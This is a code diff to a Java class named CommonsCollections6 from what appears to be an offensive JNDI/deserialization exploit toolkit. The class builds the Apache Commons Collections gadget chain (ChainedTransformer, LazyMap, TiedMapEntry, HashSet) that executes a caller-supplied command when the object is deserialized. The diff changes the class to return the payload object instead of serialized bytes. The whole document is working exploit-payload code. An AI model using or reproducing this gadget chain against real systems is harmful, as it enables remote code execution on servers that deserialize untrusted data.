@@ -5,13 +5,12 @@ import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
+import java.io.Serializable;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.HashSet;
@@ -33,17 +32,19 @@ import java.util.Map;
  * <p>
  * by @matthias_kaiser
  */
-public class CommonsCollections6 implements ObjectPayload<Byte> {
+public class CommonsCollections6 implements ObjectPayload<Serializable> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Serializable getObject(PayloadType type, String... param) throws Exception {
         String              command          = param[0];
-        final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
-        Transformer         transformerChain = new ChainedTransformer(transformers);
-        final Map           innerMap         = new HashMap();
-        final Map           lazyMap          = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry        entry            = new TiedMapEntry(lazyMap, "nu1r");
-        HashSet             map              = new HashSet(1);
-        map.add("nu1r");
+        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
+        HashSet map = new HashSet(1);
+        map.add("su18");
         Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
@@ -79,18 +80,6 @@ public class CommonsCollections6 implements ObjectPayload<Byte> {
         Reflections.setAccessible(keyField);
         keyField.set(node, entry);
 
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(map);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Byte getObject(String command) throws Exception {
-        return null;
+        return map;
     }
 }
